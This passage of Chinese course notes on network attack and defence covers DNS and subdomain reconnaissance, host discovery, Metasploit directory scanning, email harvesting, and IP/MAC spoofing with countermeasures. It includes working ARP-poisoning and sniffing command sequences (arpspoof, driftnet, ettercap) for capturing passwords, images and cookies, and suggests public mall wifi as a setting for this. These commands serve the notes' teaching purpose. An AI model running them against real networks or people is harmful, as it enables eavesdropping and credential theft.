alt="image-20210313125724339"></p><p>根域名服务器:最高级别的，他无所不知，只管大事，细节不管。</p><p>com顶级域名服务器:com是顶级，google是二级</p><p>对应返还后，本地域名服务器将对应关系存储到DNS高速缓存中</p><p><strong>DNS域名解析基本过程</strong></p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210313130354066.png" alt="image-20210313130354066"></p><p>13套根服务器中，1套主根，12套副根</p><h5 id="DNS收集信息—whois"><a href="#DNS收集信息—whois" class="headerlink" title="DNS收集信息—whois"></a>DNS收集信息—whois</h5><p>目前教育网的查不了，只能查询公网的</p><p>直接百度whois查询，找到相关信息</p><p>在whois查询中，注册人姓名和邮箱信息，所有人往往就是管理员。</p><p><strong>可以通过联系人 联系邮箱进行whois反查，查询更多和联系人或邮箱相关的域名</strong></p><h5 id="域名信息查询"><a href="#域名信息查询" class="headerlink" title="域名信息查询"></a>域名信息查询</h5><p>host命令与dig命令</p><blockquote><p>输入命令名 可以直接回车或-h</p><p>查看帮助 具体使用方法</p></blockquote><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210313132604236.png" alt="image-20210313132604236"></p><ul><li><p>host -a hebtu.edu.cn</p><p>QUESTION SECTION： hebtu.edu.cn(==要查询的域==)</p><p>ANSWER SECTION: ns.hebtu.edu.cn（由这个域名服务器完成域名解析）</p><p>此时ping ns.hebtu.edu.cn</p><p>返回202.206.100.36 域名服务器的ip地址</p></li><li><p>host -a www.hebtu.edu.cn(==要查询的主页==)</p><p>ANSWER SECTION： </p><p>A记录是IPv4 AAAA是IPv6</p></li><li><p>dig hebtu.edu.cn any</p></li><li><p>dig baidu.com any</p><p>baidu.com和hebtu.edu.cn都是域</p></li><li><p>host -t mx hebtu.edu.cn</p><p>查看谁在处理邮件信息</p></li><li><p>dig www.hebtu.edu.cn +trace</p><p>查看请求发出后 域名完整的请求过程</p></li></ul><h5 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举"></a>子域名枚举</h5><p>通过主域名得到所有子域名信息，再通过子域名查询其对应的主机IP  <strong>hebtu.edu.cn</strong>（即判断hebtu三级域名下是否还有子域名）</p><p>注意:子域名等级越小，在域名中越靠前</p><p><strong>dnsenum</strong></p><p>子域名字典路径:/usr.share/dnsenum</p><p><code>dnsenum</code> -r(使用递归方式枚举) -f(使用字典) /usr/share/dnsenum/dns.txt baidu.com [-o baidu.txt]</p><p>功能：获取各种DNS资源记录，根据字典暴力枚举子域名、主机名、C段网络扫描和反向网络查找</p><blockquote><p>合理使用tab 可以在shell中对命令进行补全</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/dnsenum</span><br><span class="line">./dnsenum  -f dns.txt --dnsserver 8.8.8.8 cisco.com -O cisco.txt</span><br></pre></td></tr></table></figure><p>-f dns.txt 指定暴力破解文件；<br>—dnsserver 指定dns服务器；如果不加，用目前主机的DNS解析；如果加上，可以指定任何DNS服务器做当前解析<br>cisco.com  为目标域；<br>-O  cisco.txt 输出到文件cisco.txt</p><p><strong>dnsrecon</strong></p><p><strong>功能：强大的域名信息收集和枚举工具，支持所有域名枚举和域名资源记录查询</strong></p><p>用法：dnsrecon -d 目标域名 -D 字典文件 -t {std|brt|axfr}</p><p>-t brt 使用内建字典；-t std 默认的标准查询；-t axfr 标准加axfr记录</p><p>字典路径 /usr/share/dnsrecon/namelist.txt</p><p>每个命令用到字典不同，导致结果不同</p><p><strong>fierce</strong></p><p>和前面两个功能基本相同，只是命令选项不同（这个速度快）</p><p>用法：fierce -dns 目标域名 [-dnsserver 指定DNS] [-range ip地址范围] [-threads 线程数] [-wordlist 字典路径]</p><p>fierce -dns hebtu.edu.cn -wordlist ==/usr/share/fierce/hosts.txt==</p><h4 id="第二部分-IP信息收集"><a href="#第二部分-IP信息收集" class="headerlink" title="第二部分 IP信息收集"></a>第二部分 IP信息收集</h4><h5 id="内网IP搜索"><a href="#内网IP搜索" class="headerlink" title="内网IP搜索"></a>内网IP搜索</h5><p><strong>ICMP搜索</strong></p><p>ICMP互联网控制报文协议 向地址发送request请求，得到对方的responese,说明网络是通的。有缺陷是因为会受到防火墙的影响。nping基于ICMP协议，不一定成功。(ping不通也因为可能是防火墙拦截)</p><ul><li><p>nping</p><p><code>nping -c 1 192.168.43.15/24</code>就在地址段中开始找</p><p>/24网络地址前缀，代表32位地址前24为1，代表整个C类地址的网段。若/24则.15写成任意数字都行，因为都代表129.168.43网段中任意地址。</p><p><code>nping -c 1 192.168.43.15/25</code> 43.1-43.126</p><p><code>nping -c 1 192.168.43.129/25</code> 43.129-43.254</p><p>-c 1代表向地址段中每一个地址发送数据包</p></li></ul><p><strong>ARP搜索</strong></p><p>ARP协议是ip地址到MAC地址的映射。ARP搜索都是在某一个网段中进行搜索。</p><ul><li><p>netdiscover</p><p><code>netdiscover -r 192.168.43.150/24</code></p><p>-r 代表是一个网段</p><p>可以搜索到 IP MAC地址 设备类型</p></li><li><p>nmap</p><p>nmap [-PA [端口]] [-PS [端口]] [-PU [端口]] -sn -n 地址范围</p><p>-sn: ping扫描- 禁止端口扫描</p><p>-sn看目标是否在线，并不会扫描对方的端口</p><p>-PS [portlist]: TCP SYN扫描</p><p>-PA[portlist]: TCP ACK扫描</p><p>TCP报文段中有SYN ACK标志位</p><p>-PU [portlist]: UDP 扫描</p><p>在nmap中选项区分大小写</p><p><code>nmap -n -PS -PA8080 -sn 192.168.1.0/24</code></p></li><li><p>Cain&amp;Abel</p><p>Windows下小工具，自行下载</p><p>搜索IP信息 </p></li></ul><h2 id="class3"><a href="#class3" class="headerlink" title="class3"></a>class3</h2><p>1.使用多台虚拟机和主机搭建环境时，设置同一种上网上方式(NAT或桥接)，若不使用同一种方式，即使手动设置ip地址，也是不通的。</p><p>2.关于ping:<br>基于ICMP协议，有一些局限性。并不是ping通就代表网络通，不通就代表网络不通。如果对方开启了防火墙，ping会被阻止，所以无法确定网络是否联通。</p><p>最简单有效的是nmap,nmap ip 若能扫描出对方的窗口或显示up状态，则说明网络是畅通的。</p><h3 id="WEB挖掘分析"><a href="#WEB挖掘分析" class="headerlink" title="WEB挖掘分析"></a>WEB挖掘分析</h3><h4 id="利用搜索引擎"><a href="#利用搜索引擎" class="headerlink" title="利用搜索引擎"></a>利用搜索引擎</h4><p>通过搜索引擎从WEB站点中寻找和搜索攻击目标的相关信息</p><p>inurl:admin.asp  incurl:是特定搜索引擎中关键字 意思是在url中进行查找 </p><h4 id="目录结构分析"><a href="#目录结构分析" class="headerlink" title="目录结构分析"></a><strong>目录结构分析</strong></h4><ul><li><p>HTML、ASP/PHP/JSP/ASPX等源代码及其注释语句</p></li><li><p>按照内容或功能分理出一些子目录，</p></li><li><p>许多网站的后台管理目录名字很常见，如admin、cms</p></li><li><p>特殊后缀文件文件.inc,.bak,.txt,.sql</p></li><li><p>暴力搜索</p></li></ul><h5 id="利用kali-metasploit"><a href="#利用kali-metasploit" class="headerlink" title="利用kali metasploit"></a>利用kali metasploit</h5><p><code>msfconsole</code> //启动matasploit</p><p>共有七个功能模块，每个功能模块前都带有数字，每个数字代表在当前模块中有多少子模块(类似于枪支metasploit的子弹有多少)。</p><p>目录 /usr/share/metasploit-framework</p><p>对应模块 /usr/share/metasploit-framework/modules</p><p>1.搜索模块</p><p>search brute_dirs,dir_scanner等</p><p>search是命令，后边跟的是子弹。这条命令的含义是寻找子弹的路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search brute_dirs //找到brute_dirs路径</span><br><span class="line">use auxiliary/scanner/http/brute_dirs //子弹上膛</span><br><span class="line">&gt;show options//查看模块涉及的参数</span><br></pre></td></tr></table></figure><p>Name:参数的名字 Current Setting:当前设置值</p><p>Required:布尔型，yes表示当前参数必须有值，no可以没有值     description:对参数的解释</p><p><strong>brute_dirs</strong></p><p>brute_dirs的几个参数:<br>RHOSTS 远程主机 带s说明既可以设置一个地址也可以设置一个地址段  RHOSTS的required值为yes说明必须设置值，不能为空</p><p>RPORT 对方(要收集信息的服务器)的端口</p><p><code>&gt;set rhosts 192.168. .</code>设置使用set 设置rhosts</p><p>通过nmap扫描该ip 发现其在80端口有http服务，故RPORT不同修改 使用默认值80即可</p><p><code>run 或者 exploit//子弹发射(进行目录扫描)</code> 一般为了节省时间使用run  结果的多少和字典大小有关</p><p><strong>dir_scanner</strong></p><p>如果要换子弹需要把当前的退出 <code>&gt;back</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search dir_scanner</span><br><span class="line">use xxx/xx/xx/scanner</span><br><span class="line">&gt;show options</span><br></pre></td></tr></table></figure><p>set threads 10 线程大并发高攻击速度快，但被发现的概率高</p><h4 id="邮件地址搜集"><a href="#邮件地址搜集" class="headerlink" title="邮件地址搜集"></a>邮件地址搜集</h4><h5 id="1-搜索引擎"><a href="#1-搜索引擎" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h5><p>例如:搜索河北师大相关邮箱</p><p>搜索@hebtu.edu.cn 但不是完全准确的</p><h5 id="2-metasploit-search-email-collector模块"><a href="#2-metasploit-search-email-collector模块" class="headerlink" title="2.metasploit search_email_collector模块"></a>2.metasploit search_email_collector模块</h5><p>参数 domain:邮箱的域(hebtu.edu.cn)</p><p>但这个模块不管用，搜索机制是用微软的BING、GOOGLE、YAHOO 但都是外网，国内地址无法使用</p><h5 id="3-theHarvester"><a href="#3-theHarvester" class="headerlink" title="3.theHarvester"></a>3.theHarvester</h5><p>可以指定搜索引擎</p><p>从搜索引擎 (baidu、yahoo)中的前200项搜索结果中挖掘目标域里的电子邮件地址和主机名</p><p>从搜索引擎 (baidu、yahoo)中的前200项搜索结果中挖掘目标域里的电子邮件地址和主机名</p><p>theHarvester -d hebtu.edu.cn -l 200 -b baidu</p><p>usage:<img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210322233537441.png" alt="image-20210322233537441"></p><p>此处-b 后加搜索引擎域名 注意不要加.com(完整域名)</p><h5 id="4-邮箱地址查找工具—snovio"><a href="#4-邮箱地址查找工具—snovio" class="headerlink" title="4.邮箱地址查找工具—snovio"></a>4.邮箱地址查找工具—snovio</h5><p>功能非常强大，可以使用google插件也可以使用网址</p><p><a href="https://app.snov.io/login" target="_blank" rel="noopener">https://app.snov.io/login</a></p><h4 id="拓扑确定"><a href="#拓扑确定" class="headerlink" title="拓扑确定"></a>拓扑确定</h4><p>侦察目标的网络拓扑结构，用于找到薄弱点实施入侵</p><h5 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h5><ul><li><p>向目标主机发送不同生存时间(TTL)的ICMP、TCP或UDP报文来确定到达目标主机的路由</p></li><li><p>交换节点可能装有包过滤机制，ICMP、TCP和UDP报文都可能被过滤</p></li><li><p>traceroute [-4] { -I | -T | -U} [-w 等待时间] [-p 端口] [-m 最大跳数]</p></li></ul><p>traceroute查看发送出去的探测数据包经过哪些路由器</p><p>例如<code>traceroute www.hebtu.edu.cn</code></p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210323000301211.png" alt="image-20210323000301211"></p><p>traceroute默认情况下向目标发送三个数据报 ip地址后跟着的三个时间是三个数据报的往返时间</p><p>第二跳显示* 是因为第二跳经过的路由器会把发过去的数据报过滤，收不到对方服务器做的响应，所以没法把路由器的地址打印出来</p><p>第五跳有三个路由器的地址，因为每个数据报发出去以后，都是可以单独路由，走不同的路径。</p><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><p>通过操纵人来实施某些行为或泄露机密信息的攻击方法，实际是对人的欺骗</p><h5 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a><strong>Maltego</strong></h5><ul><li><p>高度自动化的信息收集工具</p></li><li><p>收集域名服务器、IP地址、子域或个人信息</p></li><li><p>跨平台</p></li><li><p>信息可视化</p></li></ul><p>在kali左上方搜索选择 01-Information Gathering中的maltego</p><p>Run maltego CE版本-&gt;www.maltego.com/ce-registration进行注册(外网)</p><p>左上角新建-&gt;在实体模版搜索Domain-&gt;修改域名(例如hbu.edu.cn)-&gt;上方菜单栏点击machines-&gt;Run Machine（会给多种搜索方法，越往下级别越高，速度越慢） 搜索该域名的拓扑结构</p><p>如果打算对某一个目标进一步分析 在某个图标点击右键会出现进一步跟踪</p><h5 id="Zenmap"><a href="#Zenmap" class="headerlink" title="Zenmap"></a><strong>Zenmap</strong></h5><p>nmap的图形使用接口，集成traceroute功能(支持ICMP、TCP和UDP追踪)</p><p>在windows安装nmap后会有图标 Zenmap</p><p>把配置中扫描方式改为Quick traceroute扫描</p><p>还是可以查看到路由信息(拓扑结构)</p><h4 id="网络监听"><a href="#网络监听" class="headerlink" title="网络监听"></a>网络监听</h4><p>一种被动的信息收集方法，往往不会被目标察觉</p><p>最佳位置是网关、路由器和防火墙</p><p><strong>截获SMTP(发电子邮件用到的协议)、HTTP、FTP、POP3(收邮件用的协议)和TELNET等网络协议报文，因为它们明文传输</strong></p><p>http明文传输不安全，使用https较安全</p><h5 id="1-Cain-amp-Abel"><a href="#1-Cain-amp-Abel" class="headerlink" title="1.Cain&amp;Abel"></a>1.Cain&amp;Abel</h5><p>局域网账号口令收集和破解工具，截取各种常见网络协议的账号和口令</p><p>安装WinPcap抓包工具实现cain启动</p><p>1）扫描网段存活主机</p><p>先点击网卡图标，选择Sniffer，右键选择扫描MAC地址。<strong>用于扫描当前网段中存活主机</strong>，扫描时把协议都选上</p><p>扫描网段时自己的ip不显示</p><p>2）ARP</p><p>点击下方栏ARP，右键Remove all,点击上号加号，对刚才扫描出的地址进行监听。</p><p>监听的目标左侧选网关，右侧选要监听的目标。</p><p>在地址段中的网关要么是.1要么是.254,几乎所有的管理员都这么使用。(.0代表网络不能使用，.255是广播地址)</p><p>可以同时检测多个ip。</p><p>3)ARP毒化</p><p>点击上方任务栏黄色图标，开始毒化。</p><p>status变成Poisoning</p><p>假设被监听的主机在使用网络服务，如使用ftp下载文件或者登录后台(http)</p><p>点击下方passwords 可以监听到某ftp服务器 登录账密</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210323231417714.png" alt="image-20210323231417714"></p><p>以上类型都能监听到。使用场景:商场的公用免费wifi,添加多条记录监听主机行为。如果使用明文传输的服务，可以监听记录下来。</p><h5 id="2-局域网的嗅探-ettercap-driftnet"><a href="#2-局域网的嗅探-ettercap-driftnet" class="headerlink" title="2.局域网的嗅探 ettercap+driftnet"></a>2.局域网的嗅探 ettercap+driftnet</h5><p>1）driftnet</p><p>图片和MPEG音频收集工具，实时从各种网络协议中<strong>提取图片数据或MPEG音频</strong></p><p>Kali2020.1 不支持driftnet，需要手动安装</p><p>Kali2020.1原有源地址无法更新，需要修改</p><p>driftnet [-m 指定抓取图片数量 -a] [-S] [-d 指定存放目录名] [BPF过滤器]</p><p>原理:</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210323231853606.png" alt="image-20210323231853606"></p><p>主机B为被攻击方，主机要上网必须设置网关(网关就是路由器的一个ip地址)。主机B要上网不仅需要知道路由器ip地址，还要知道路由器的MAC地址。</p><p>主机B把数据帧发给网关(路由器的入口)，网关把数据包再交给主机B上网的目标。</p><p>主机A为攻击方，主机A向B发送大量数据包告诉主机B，网关的MAC发生了变化。欺骗主机B将A变成网关，主机<em>B</em>在对外传输数据时，便将数据传送给假网关—主机<em>A</em>，主机<em>A</em>就可以窃听分析主机<em>B</em>的数据包。</p><p>利用<em>driftnet</em>软件窃听数据，就可以看到主机<em>B</em>所浏览的内容。</p><p>2）局域网欺骗攻击(ARP欺骗，流量经过自己网卡，再从网关出去)</p><p><strong>arpspoof—arp攻击工具</strong></p><p>apt-get install dsniff ssldump</p><p>用法:</p><p>arpspoof -i 自己网卡 -t 目标IP 网关</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward (流量转发)//改成1 存到ip_forward中</span><br><span class="line">arpspoof   -i eth0 -t 目标    网关</span><br><span class="line">driftnet -i eth0 看着捕获的图片</span><br><span class="line">ettercap -Tq -i eth0进行账号密码嗅探（可能）</span><br></pre></td></tr></table></figure><p>如果流量转发这条没有，会造成目标的断网，无法达到监听目的。ip_forward文件路径为/proc/sys/net/ipv4</p><p><code>cat ip_forward</code> 默认情况下是0 即流量转发不打开</p><p>ifconfig查看网卡名称 要让所有的流量经过kali的网卡</p><p><code>arpspoof   -i eth0 -t 目标    网关</code> 这一步的目的是向被害方发送大量ARP包，告诉受害方当前网关的MAC地址发生了变化。(即ARP毒化)  <strong>终端挂起，不要终止</strong></p><p><code>driftnet -i eth0</code>监听kali的网卡 可以抓到对方上网过程中的图片（只能抓图片，有一定延迟） 并会把图片存下来</p><p><code>ettercap -Tq -i eth0</code> 可能抓到登录账密</p><p>3）Ettercap</p><p>调用图形化方式     <code>Ettercap -G</code></p><p>Sniffing at startup(和cain一样，用于监听)</p><p>下一行选择监听网卡 点上方对号后点击上方三个点</p><p>Host-&gt;Scan for hosts(进行扫描)-&gt;点击三个点-&gt;Host-&gt;Host list</p><p>随后操作相同 把监听的目标设成taret1 把网关设成target2</p><p>进行ARP毒化，MITM menu-&gt;ARP poisoning</p><p>同样需要driftnet</p><h5 id="3-p0f"><a href="#3-p0f" class="headerlink" title="3.p0f"></a>3.p0f</h5><p>分析网络数据包来<strong>判断目标主机操作系统类型</strong>、网络地址转换(NAT)、负载均衡设置、应用代理</p><p>以及用于检测对方的上网的行为(浏览了一些什么网站)</p><p>手动安装<code>apt-get install p0f</code></p><p>同样需要先打开流量转发，否则对方上不了网</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward (流量转发)</span><br><span class="line">arpspoof   -i eth0 -t 目标     网关</span><br><span class="line">p0f 新终端运行</span><br></pre></td></tr></table></figure><p>先做arp毒化再运行p0f</p><p>p0f [-p] [-i 指定接口] [BPF过滤器]</p><p>浏览一个网站会接收到很多响应</p><h5 id="4-ferret"><a href="#4-ferret" class="headerlink" title="4.ferret"></a>4.ferret</h5><p>提取各类协议报文关键字段，适用于<strong>窃取cookie和HTTP会话信息</strong></p><p>cookie是进行身份认证时，输入的账号和口令转换成特定的字符串就是cookie。如果被截获，虽然不知道账号和口令，但依然能用你的身份登录。</p><h2 id="class4"><a href="#class4" class="headerlink" title="class4"></a>class4</h2><p>IP:网络层地址 MAC:数据链路层地址</p><h3 id="网络隐身-1"><a href="#网络隐身-1" class="headerlink" title="网络隐身"></a>网络隐身</h3><h4 id="IP地址欺骗"><a href="#IP地址欺骗" class="headerlink" title="IP地址欺骗"></a>IP地址欺骗</h4><p>原因: TCP/IP路由机制只检查报文<strong>目标地址(目的地址)</strong>的有效性，可以定制虚假的源IP地址<br>➢IP欺骗(IP Spoofing)<br>    ➢利用主机间的正常信任关系，通过修改IP报文中的源地址，以绕开主机或网络访问控制<br>➢C与A在同一LAN(在同一网段)中，IP欺骗比较容易<br>➢C与A在不同LAN中，UDP欺骗比较容易</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210325081142446.png" alt="image-20210325081142446"></p><p>如果有大量C冒充A，B会向A发送大量响应，会导致A宕机或拒绝服务。同理，B也会因为资源耗尽拒绝服务。</p><p>如果A与B建立TCP连接进行通信，C实施IP欺骗就非常困难。</p><p>IP欺骗过程</p><ul><li><p>使A停止工作</p></li><li><p>猜测初始序列号</p><p>基于时间</p><p>随机增加</p><p>固定不变</p></li><li><p>建立欺骗连接</p></li></ul><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210325081634587.png" alt="image-20210325081634587"></p><p>在TCP报文段中的序号 主机B每建立连接，序号就会发生变化</p><p>C向B发送报文 采样和猜测初始序号ISN</p><p>B收到第一次握手请求后，B会向A发送第二次握手</p><p>猜测第二次握手序号是第一次握手序号+1</p><p>第三次握手确认号为猜测的ISN+1</p><p>成功的前提是通信主机之间仅凭IP地址标识对方身份，并且攻击者可以正确猜测TCP连接的初始序列号(ISN)</p><p>防范措施</p><ul><li><p>使用基于加密的协议如IPSec或SSH进行通信</p></li><li><p>通信时使用口令或证书进行身份验证</p></li><li><p>使用随机化的ISN</p></li><li><p>在路由器上配置包过滤策略，检测报文的源IP地址是否属于网络内部地址</p></li><li><p>不要使用基于IP地址的信任机制</p></li></ul><h4 id="MAC地址欺骗—突破基于MAC地址的局域网访问控制"><a href="#MAC地址欺骗—突破基于MAC地址的局域网访问控制" class="headerlink" title="MAC地址欺骗—突破基于MAC地址的局域网访问控制"></a>MAC地址欺骗—突破基于MAC地址的局域网访问控制</h4><p>1.基于MAC的访问控制</p><p>交换机仅转发源MAC地址在预定义的访问列表中的报文</p><p>2.基于IP和MAC的访问控制</p><p>仅转发(P,MAC)地址对在访问列表中的报文，IP和MAC必须都在访问列表中</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210325082938436.png" alt="image-20210325082938436"></p><p>3.修改MAC地址的方法</p><p>知道局域网中能上网的A的MAC地址，可以修改为A的MAC地址冒充A上网</p><p>MAC地址48bit,前24bit代表公司，后24bit为序号。二者组织起来保证全球唯一性。ROM为主存寄存器，MAC地址写在ROM中，不可改变。故硬修改不太现实。</p><p>软修改</p><p>网卡驱动程序从系统中读取地址信息并写入网卡的硬件存储器</p><p>硬修改</p><p>修改网卡硬件ROM中存储的原有地址</p><p>4.Windows系统修改MAC网卡</p><p>物理机中用到的方法</p><p>本地属性-网络客户端-配置-高级-网络地址 修改MAC地址</p><p>虚拟机中用到的方法</p><p>计算机-&gt;属性-&gt;设备管理器-&gt;网络适配器(这就是网卡的名字)-&gt;详细信息-&gt;驱动程序关键字 复制</p><p>进到注册表(regedit)-&gt;点击查找 搜索4d36c972-c325-1cc-bfc 1-08002bc103 18(网卡标识符，即主机上网时用到的网卡相关的配置)-&gt;展开后有多个子文件夹 说明有多种上网方式-&gt;打开0007 DriverDesc(驱动器的描述)  其值就是当前上网网卡-&gt;在0007右键新建字符串值(子键) 命名Networkaddress 随意填写数字12个十六进制(MAC地址48位)为MAC地址</p><p>网卡先禁用再启用</p><p>windows查看mac地址 ipconfig/all</p><p>5.Linux系统修改MAC</p><p><strong>ifconfig</strong></p><p>ifconfig ether参数代表MAC地址 </p><p>先禁用网卡 <code>ifconfig eth0 down</code></p><p><code>ifconfig eth0 hw ether 000c2969da99</code>  hw代表hardwire（硬件）</p><p><code>ifconfig eth0 up</code></p><p>修改后上网不受影响</p><p><strong>macchanger</strong></p><p>使用前需要先安装</p><p>用法: macchanger 选项 eth0</p><p>-p: 复位到原来的永久硬件</p><p>-a:设置同类的<strong>随机供应商</strong>MAC</p><p>-A:设置任意类型的<strong>随机供应商</strong>MAC</p><p>-r:设置完全随机的MAC</p><p>6.问题</p><p><strong>如果局域网中有两台在线的主机具有相同的MAC地址，它们是否能同时正常通信?</strong></p><p>目前局域网内联网都采用星型方式(交换机)</p><p>交换机有很多端口，每一个端口都是没有地址的，而路由器的端口都有自己的MAC地址。交换机中的CAM表中的值是它连接设备的MAC地址</p><p>根据交换机的工作机制(CAM)，两台主机无法同时通信。假设主机A和B的MAC地址都是MAC_ AB，而A连接交换机的端口1，B连接交换机的端口2。</p><p>当A和B同时发送报文时，端口地址表中记录的MAC_ AB只会有1条记录。那么当其它主机给A或者B发送报文时，如果端口地址表中记录的是端口2，那么A不会收到报文，如果记录的是端口1，那么B不会收到报文。</p><p>类似同一本书不能同时给两个人看。</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210325090153427.png" alt="image-20210325090153427"></p><h4 id="网络地址转换-NAT"><a href="#网络地址转换-NAT" class="headerlink" title="网络地址转换(NAT)"></a>网络地址转换(NAT)</h4><p>将私有地址转换为公有IP地址的技术，<strong>对终端用户透明</strong>(用户不需要知道具体细节)</p><h5 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h5><p>A:0.0.0.0-127.255.255.255  </p><p>在A类地址中 10.0.0.0-10.255.255.255 是私有地址</p><p>127.0.0.0-127.255.255.255 私有地址</p><p>B:128.0.0.0-191.255.255.255 </p><p>172.16.0.0-172.31.255.255 私有地址</p><p>C:192.0.0.0-223.255.255.255 </p><p>192.168.0.0-192.168.255.255 私有地址</p><p>D:多播 224-239 E:保留 240-255</p><p>私有地址是不能被路由的，可以在局域网中使用。公有地址是可路由的，由国际化组织分配给某些国家某些地址段。</p><p>配置私有地址需要进行转换为公有地址。</p><h5 id="转换方式"><a href="#转换方式" class="headerlink" title="转换方式"></a>转换方式</h5><p>1.静态转换<br>可实现外网到内网的映射，有专门的地址表</p><p>将内网的私有IP地址转换为公有IP地址，转换方式是一对一且固定不变</p><p>2.动态转换<br>可用于没有传输层的IP报文，如OSPF路由报文</p><p>谁用到网络谁获得一个临时的对外地址，用完后其他用户请求时会重用这个对外地址</p><p>内网的私有IP地址转换为公用IP地址时，NAT会从公用IP地址池中随机选择一 个</p><p>3.端口地址转换PAT<br>共享一个IP，只能适用于基于UDP/TCP的网络通信</p><p>既改变外出报文的IP地址，也改变报文的端口</p><p>例如:对外地址只有一个，内部200台电脑，在ip地址加上端口对每个主机发出的数据报进行区分</p><h5 id="地址转换表"><a href="#地址转换表" class="headerlink" title="地址转换表"></a>地址转换表</h5><p>静态表项在配置后即固定不变(静态转换)</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210325110114439.png" alt="image-20210325110114439"></p><p>有一个静态一一对应的地址表(黄圈中)  内部主机要访问服务器，数据报经过重新封装  路由器查表做简单的ip地址替换  </p><p>动态表项在每次会话新建立后保持不变</p><p>动态不光会替换ip,还会替换端口。</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210325110630054.png" alt="image-20210325110630054"></p><p>内部主机很多，但可用的地址池不多，所以端口也发生了改变。</p><h4 id="代理隐藏"><a href="#代理隐藏" class="headerlink" title="代理隐藏"></a>代理隐藏</h4><p>不直接与目标主机通信，而是通过代理服务器间接地与目标主机通信，相当于一个中介</p><p>列举出一些可用代理 :www.kuaidaili.com</p><p>代理服务器</p><p>将内网与外网隔离</p><p>正向代理</p><p>正向代理的过程，隐藏了<strong>真实的请求客户端</strong>，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求。</p><p>反向代理</p><p>反向代理隐藏了<strong>真实的服务端</strong>，反向代理服务器会把请求转发到真实的服务器那里去。</p><h5 id="正向代理—翻墙软件"><a href="#正向代理—翻墙软件" class="headerlink" title="正向代理—翻墙软件"></a><strong>正向代理</strong>—<strong>翻墙软件</strong></h5><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210325093905185.png" alt="image-20210325093905185"></p><p>正向代理的用途：</p><ul><li><p>访问原来无法访问的资源，如google；</p></li><li><p>可以做缓存，加速访问资源；</p></li><li><p>对客户端访问授权，上网进行认证；</p></li><li><p>代理可以记录用户访问记录，对外隐藏用户信息。</p></li></ul><h5 id="反向代理—Nginx-服务器"><a href="#反向代理—Nginx-服务器" class="headerlink" title="反向代理—Nginx 服务器"></a>反向代理—Nginx 服务器</h5><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210325094231071.png" alt="image-20210325094231071"></p><p>你对百度的请求发给了server1 还是server2 由域名的服务器来完成。反向代理隐藏了后边的内容。</p><p>很类似的:你打10086 实际给你解决问题的是某个工作人员，但接听之前你并不知道接待你的客服是哪个。</p><p>反向代理的作用：</p><ul><li><p>保证内网的安全，阻止web攻击，大型网站，将反向代理作为公网访问地址，Web服务器使用私有地址</p></li><li><p>负载均衡，通过反向代理服务器来优化网站的负载</p></li></ul><h5 id="正向代理和反向代理区别"><a href="#正向代理和反向代理区别" class="headerlink" title="正向代理和反向代理区别"></a>正向代理和反向代理区别</h5><p>正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端.</p><p>反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210325094639035.png" alt="image-20210325094639035"></p><h5 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h5><p>透明:用户使用起来在终端不用进行任何操作，就和不存在一样像和服务器直接通信，但实际是存在的</p><ul><li><p>通常放置在网关位置</p></li><li><p>客户机向目标发起请求</p></li><li><p>代理主机自动建立与服务器的连接</p></li><li><p>转发客户请求并接收应答</p></li><li><p>最后转发给客户</p></li><li><p>工作在传输层或应用层</p></li></ul><h5 id="常用代理"><a href="#常用代理" class="headerlink" title="常用代理"></a>常用代理</h5><p>HTTP代理</p><p><strong>主要作用是代理浏览器访问WEB服务器，端口一般为80、8080</strong></p><p>SSL代理</p><p><strong>代理访问<a 